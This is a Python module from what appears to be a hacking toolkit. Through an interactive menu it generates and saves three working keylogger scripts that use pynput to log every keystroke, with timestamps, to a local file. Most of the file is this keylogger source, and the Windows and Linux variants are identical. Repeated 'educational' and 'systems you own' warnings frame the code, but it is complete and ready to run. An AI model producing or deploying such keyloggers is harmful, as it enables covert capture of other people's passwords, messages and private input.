#!/usr/bin/env python3
"""
Keylogger Generator Module
Educational demonstration - Use only on systems you own!
"""

import os
import platform
from colorama import Fore, Style

class KeyloggerGenerator:
    def __init__(self):
        self.keyloggers_dir = "keyloggers"
        if not os.path.exists(self.keyloggers_dir):
            os.makedirs(self.keyloggers_dir)
    
    def print_banner(self):
        """Print keylogger generator banner"""
        banner = f"""
{Fore.CYAN}╔══════════════════════════════════════════════════════════════╗
║              {Fore.YELLOW}Keylogger Generator{Fore.CYAN}                     ║
╠══════════════════════════════════════════════════════════════╣
║  {Fore.RED}WARNING: Use only on systems you own!{Fore.CYAN}                  ║
║  {Fore.RED}Unauthorized keylogging is ILLEGAL!{Fore.CYAN}                    ║
╚══════════════════════════════════════════════════════════════╝
{Style.RESET_ALL}
"""
        print(banner)
    
    def generate_windows_keylogger(self, output_file="keylog.txt"):
        """Generate Windows keylogger"""
        keylogger = f'''#!/usr/bin/env python3
# Windows Keylogger (Educational purposes only)
# WARNING: Use only on systems you own!

import pynput
from pynput import keyboard
import logging
from datetime import datetime
import os

# Configure logging
log_file = "{output_file}"
logging.basicConfig(
    filename=log_file,
    level=logging.DEBUG,
    format='%(asctime)s: %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S'
)

def on_press(key):
    """Handle key press events"""
    try:
        if hasattr(key, 'char') and key.char:
            logging.info(f'Key pressed: {{key.char}}')
        else:
            logging.info(f'Special key pressed: {{key}}')
    except Exception as e:
        logging.error(f'Error: {{e}}')

def on_release(key):
    """Handle key release events"""
    if key == keyboard.Key.esc:
        # Stop listener on ESC key
        logging.info('Keylogger stopped by user')
        return False

def main():
    print("Keylogger started (Educational purposes only)")
    print("Press ESC to stop")
    print(f"Logging to: {{log_file}}")
    
    # Start keyboard listener
    with keyboard.Listener(
        on_press=on_press,
        on_release=on_release
    ) as listener:
        listener.join()

if __name__ == "__main__":
    main()
'''
        return keylogger
    
    def generate_linux_keylogger(self, output_file="keylog.txt"):
        """Generate Linux keylogger"""
        keylogger = f'''#!/usr/bin/env python3
# Linux Keylogger (Educational purposes only)
# WARNING: Use only on systems you own!

import pynput
from pynput import keyboard
import logging
from datetime import datetime
import os

# Configure logging
log_file = "{output_file}"
logging.basicConfig(
    filename=log_file,
    level=logging.DEBUG,
    format='%(asctime)s: %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S'
)

def on_press(key):
    """Handle key press events"""
    try:
        if hasattr(key, 'char') and key.char:
            logging.info(f'Key pressed: {{key.char}}')
        else:
            logging.info(f'Special key pressed: {{key}}')
    except Exception as e:
        logging.error(f'Error: {{e}}')

def on_release(key):
    """Handle key release events"""
    if key == keyboard.Key.esc:
        # Stop listener on ESC key
        logging.info('Keylogger stopped by user')
        return False

def main():
    print("Keylogger started (Educational purposes only)")
    print("Press ESC to stop")
    print(f"Logging to: {{log_file}}")
    
    # Start keyboard listener
    with keyboard.Listener(
        on_press=on_press,
        on_release=on_release
    ) as listener:
        listener.join()

if __name__ == "__main__":
    main()
'''
        return keylogger
    
    def generate_simple_keylogger(self, output_file="keylog.txt"):
        """Generate simple cross-platform keylogger"""
        keylogger = f'''#!/usr/bin/env python3
# Simple Keylogger (Educational purposes only)
# WARNING: Use only on systems you own!

try:
    from pynput import keyboard
except ImportError:
    print("Error: pynput library not installed")
    print("Install it with: pip install pynput")
    exit(1)

import logging
from datetime import datetime

# Configure logging
log_file = "{output_file}"
logging.basicConfig(
    filename=log_file,
    level=logging.DEBUG,
    format='%(asctime)s: %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S'
)

def on_press(key):
    """Handle key press events"""
    try:
        if hasattr(key, 'char') and key.char:
            logging.info(f'{{key.char}}')
        elif key == keyboard.Key.space:
            logging.info(' ')
        elif key == keyboard.Key.enter:
            logging.info('\\n')
        elif key == keyboard.Key.tab:
            logging.info('\\t')
        else:
            logging.info(f'[{{key}}]')
    except Exception as e:
        logging.error(f'Error: {{e}}')

def on_release(key):
    """Handle key release events"""
    if key == keyboard.Key.esc:
        logging.info('\\n[Keylogger stopped]\\n')
        return False

def main():
    print("=" * 50)
    print("Educational Keylogger (For authorized use only)")
    print("=" * 50)
    print(f"Logging to: {{log_file}}")
    print("Press ESC to stop")
    print("=" * 50)
    
    logging.info('\\n[Keylogger started]\\n')
    
    # Start keyboard listener
    with keyboard.Listener(
        on_press=on_press,
        on_release=on_release
    ) as listener:
        listener.join()
    
    print("\\nKeylogger stopped.")

if __name__ == "__main__":
    main()
'''
        return keylogger
    
    def save_keylogger(self, filename, content):
        """Save keylogger to file"""
        filepath = os.path.join(self.keyloggers_dir, filename)
        with open(filepath, 'w') as f:
            f.write(content)
        return filepath
    
    def run(self):
        """Run keylogger generator interface"""
        self.print_banner()
        
        print(f"{Fore.YELLOW}[*] Select keylogger type:{Style.RESET_ALL}")
        print(f"  {Fore.GREEN}[1]{Fore.CYAN} Windows Keylogger{Style.RESET_ALL}")
        print(f"  {Fore.GREEN}[2]{Fore.CYAN} Linux Keylogger{Style.RESET_ALL}")
        print(f"  {Fore.GREEN}[3]{Fore.CYAN} Cross-platform Keylogger{Style.RESET_ALL}")
        
        choice = input(f"\n{Fore.YELLOW}[*] Select option: {Style.RESET_ALL}").strip()
        
        output_file = input(f"{Fore.YELLOW}[*] Enter output log file (default: keylog.txt): {Style.RESET_ALL}").strip()
        if not output_file:
            output_file = "keylog.txt"
        
        keylogger = None
        filename = None
        
        if choice == '1':
            keylogger = self.generate_windows_keylogger(output_file)
            filename = "windows_keylogger.py"
        elif choice == '2':
            keylogger = self.generate_linux_keylogger(output_file)
            filename = "linux_keylogger.py"
        elif choice == '3':
            keylogger = self.generate_simple_keylogger(output_file)
            filename = "keylogger.py"
        else:
            print(f"{Fore.RED}[!] Invalid option{Style.RESET_ALL}")
            return
        
        if keylogger:
            filepath = self.save_keylogger(filename, keylogger)
            print(f"\n{Fore.GREEN}[+] Keylogger generated successfully!{Style.RESET_ALL}")
            print(f"{Fore.CYAN}[*] Saved to: {filepath}{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}[!] Dependencies: pip install pynput{Style.RESET_ALL}")
            print(f"{Fore.RED}[!] WARNING: Use only on systems you own!{Style.RESET_ALL}\n")

